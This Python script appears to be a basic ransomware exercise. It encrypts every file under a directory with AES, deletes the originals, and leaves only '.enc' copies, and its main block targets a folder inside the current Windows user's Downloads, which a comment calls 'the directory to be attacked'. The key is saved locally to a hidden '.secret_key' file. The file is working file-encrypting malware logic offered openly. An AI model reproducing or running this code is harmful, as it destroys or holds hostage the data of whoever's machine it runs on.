from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import os


# generate a random 16-byte AES key 
KEY = get_random_bytes(16) 

# save the AES key locally in a hidden file
def save_key_locally(key, file_path=".secret_key"):
    with open(file_path, "w") as key_file:
        key_file.write(key.hex()) 
    print(f"Encryption key saved to {file_path}")



# function to encrypt a file 
def encrypt_file(file_path, key):
    # open the file passed 
    with open(file_path, 'rb') as file:
        # read the file as a plaintext 
        plain_text = file.read()

    # intialize the AES cipher 
    chiper = AES.new(key, AES.MODE_CFB)

    # encrypt the file content
    chiper_text = chiper.encrypt(plain_text)

    # write the encrypted output file 
    with open(file_path + ".enc", "wb") as encrypted_file:
        # write the IV for decryption
        encrypted_file.write(chiper.iv)

        # write the encrypted text
        encrypted_file.write(chiper_text)

    # delete the original file 
    os.remove(file_path)



# function to envrypt a whole directory 
def encrypt_directory( directory, key):
    # explore the give directory 
    for root, dirs, files in os.walk(directory):
        # iterate over the files 
        for file in files:
            # excute the encryption function on each file 
            encrypt_file(os.path.join(root, file), key)


if __name__ == "__main__":
    # # pass the directory to be attacked
    # encrypt_directory("test", KEY)

    # # Save the encryption key locally
    # save_key_locally(KEY)

     # Get the current user's username dynamically on Windows
    userName = os.getlogin()

    # Define the path to the "Downloads" directory on Windows
    download_path = f"C:\\Users\\{userName}\\Downloads\\test"  # Adjust the folder as necessary

    # Pass the directory to be attacked
    encrypt_directory(download_path, KEY)

    # Save the encryption key locally
    save_key_locally(KEY)